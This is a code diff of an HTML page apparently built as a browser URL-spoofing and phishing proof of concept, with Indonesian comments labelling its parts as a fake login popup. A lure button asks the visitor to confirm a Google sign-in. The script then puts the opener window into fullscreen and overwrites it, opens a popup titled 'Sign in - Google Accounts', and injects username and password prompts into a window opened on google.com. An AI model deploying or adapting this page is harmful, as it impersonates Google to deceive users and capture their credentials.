@@ -6,67 +6,86 @@
     <title>URL Spoofing</title>
 
     <style>
-    	#button {
-			width:  150px;
-			height: 35px;
-		}
-   	</style>
-	
-	<script>
+        #button {
+            width: 150px;
+            height: 35px;
+        }
+    </style>
+
+    <script>
         function spoof() {
+            // HTML untuk halaman opener (full-screen)
+            const openerHTML = `
+                <html>
+                <head>
+                    <style>
+                        body { margin: 0; padding: 0; }
+                        #content { width: 100%; height: 100%; }
+                    </style>
+                </head>
+                <body>
+                    <img id="content" src="spoof.png">
+                </body>
+                </html>
+            `;
 
-        	var openerHTML = `
-        		<html>
-        			<head>
-        				<style>
-        					body {
-        						margin: 0;
-   								padding: 0;
-        					}
+            // HTML untuk popup phishing login
+            const popupHTML = `
+                <html>
+                <head>
+                    <title>Sign in - Google Accounts</title>
+                    <style>
+                        body { margin: 0; padding: 0; }
+                        #content { width: 100%; height: 100%; }
+                    </style>
+                </head>
+                <body>
+                    <img id="content" src="sign.png">
+                </body>
+                </html>
+            `;
 
-        					#content {
-        						width:  100%;
-    							height: 100%;
-        					}
-        				</style>
-        			</head>
+            // ============ POPUP SPOOF =============
+            let win = window.open("https://www.google.com/", "_blank");
 
-        			<body>
-        				<img id="content" src="spoof.png"></img>
-        			</body>
-           		</html>
-        	`;
+            setTimeout(() => {
+                try {
+                    win.document.write(`
+                        <h1>This is not Google!</h1>
+                        <button onclick="
+                            let username = prompt('Enter your username');
+                            let password = prompt('Enter your password');
+                            alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
+                        ">Click me</button>
+                    `);
+                    win.document.close();
+                } catch (e) {
+                    console.warn("Browser blocked write():", e);
+                }
+            }, 50);
 
-        	var popupHTML = `
-        		<html>
-        			<head>
-        				<title>Sign in - Google Accounts</title>
-        				<style>
-        					body {
-        						margin: 0;
-   								padding: 0;
-        					}
-        					
-        					#content {
-        						width:  100%;
-    							height: 100%;
-        					}
-        				</style>
-        			</head>
+            // ============ OVERWRITE OPENER ============
+            try {
+                window.opener.document.documentElement.webkitRequestFullscreen();
+                window.opener.document.write(openerHTML);
+            } catch (e) {
+                console.warn("Opener blocked:", e);
+            }
 
-        			<body>
-        				<img id="content" src="sign.png"></img>
-        			</body>
-           		</html>
-        	`;
+            // ============ POPUP LOGIN PALSU =============
+            let width = 500, height = 460;
+            let left = (screen.width / 2) - (width / 2);
+            let popup = window.open("about:blank", "second",
+                `width=${width},height=${height},top=0,left=${left}`);
 
-            window.opener.document.documentElement.webkitRequestFullscreen();
-            window.opener.document.write(openerHTML);
+            try {
+                popup.document.write(popupHTML);
+                popup.document.close();
+            } catch (e) {
+                console.warn("Popup blocked:", e);
+            }
 
-            var width=500, height=460, top=0, left=(screen.width/2)-(width/2);
-            var win = window.open("about:blank", "second", `width=${width},height=${height},top=${top},left=${left}`);
-			win.document.write(popupHTML);
-            window.close();	
+            window.close();
         }
     </script>
 </head>
@@ -75,8 +94,8 @@
     <center>
         <br>
         <h1>
-        	Please confirm you want to signin into your Google Account<br><br>
-        	<button id="button" onclick="spoof();">Confirm</button>
+            Please confirm you want to signin into your Google Account<br><br>
+            <button id="button" onclick="spoof();">Confirm</button>
         </h1>
     </center>
 </body>
